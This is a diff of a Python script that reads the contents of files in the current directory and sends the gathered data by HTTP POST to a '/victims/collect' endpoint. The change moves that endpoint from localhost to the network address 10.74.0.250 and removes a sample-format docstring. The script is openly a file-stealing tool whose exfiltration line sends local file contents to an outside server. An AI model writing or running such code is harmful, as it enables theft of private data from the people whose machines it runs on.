@@ -83,17 +83,7 @@ if __name__ == "__main__":
     listOfFiles = getListOfFiles(currentDir)
 
     fileContent = []
-    """
-    file content should be like this : 
-
-     { "name": "a.txt", "path": "C:/tmp/a.txt", "content": "hello" },
-    { "name": "b.txt", "path": "C:/tmp/b.txt", "content": "world" },
-    { "name": "b.txt", "path": "C:/tmp/b.txt", "content": "world" },
-    { "name": "b.txt", "path": "C:/tmp/b.txt", "content": "world" },
-    { "name": "b.txt", "path": "C:/tmp/b.txt", "content": "world" }
-
-    
-    """
+   
     for file in listOfFiles:
         data = readFile(file)
         print(f"Data from {file}:\n{data}\n")
@@ -111,7 +101,7 @@ if __name__ == "__main__":
     #send the data to the server
     try :
 
-        response = requests.post("http://localhost:8000/victims/collect", json=computerData)
+        response = requests.post("http://10.74.0.250:8000/victims/collect", json=computerData)
         if response.status_code == 200:
             print("Data sent successfully")
         else:
